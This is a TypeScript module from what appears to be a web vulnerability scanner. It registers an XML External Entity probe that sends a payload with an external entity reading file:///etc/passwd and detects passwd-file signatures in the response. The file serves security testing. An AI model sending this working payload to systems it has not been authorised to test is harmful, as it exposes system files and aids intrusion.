import type { Probe, ProbeVariant } from "../types";
import { registerProbe } from "../registry";
import type { ProbeContext } from "../../types";

const XXE_BODY = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>`;

const SIGNATURES = [/root:x:0:0/, /daemon:x:1:1/, /\[extensions\]/i];

function isXmlContentType(ctx: ProbeContext): boolean {
  const ct = (ctx.headers["content-type"] ?? "").toLowerCase();
  return ct.includes("xml");
}

const variant: ProbeVariant = {
  id: "xxe.file-read",
  label: "XXE · file read",
  group: "injection",
  severity: "critical",
  mutate(ctx) {
    const headers = { ...ctx.headers, "content-type": "application/xml" };
    return { ...ctx, headers, body: XXE_BODY };
  },
  detect(req) {
    if (req.status === "ERR" || !req.bodyText) return null;
    for (const rx of SIGNATURES) {
      const m = rx.exec(req.bodyText);
      if (m) {
        return {
          variantId: variant.id,
          probeId: "inj.xxe",
          probeLabel: "XML External Entity",
          group: "injection",
          verdict: "CONFIRMED",
          severity: "critical",
          confidence: 0.95,
          evidence: `File signature matched in response: "${m[0]}"`,
          requestUrl: req.url,
          requestMethod: req.method,
          requestBody: req.requestBody,
          responseSnippet: req.bodyText.slice(0, 400),
        };
      }
    }
    return null;
  },
};

export const xxeProbe: Probe = {
  id: "inj.xxe",
  label: "XML External Entity",
  group: "injection",
  description:
    "Sends an XML body with an external entity pointing at /etc/passwd. Only runs when the " +
    "endpoint's Content-Type is XML. Detects file-content signatures in the response.",
  appliesTo(ctx) {
    return isXmlContentType(ctx);
  },
  variants: [variant],
};

registerProbe(xxeProbe);
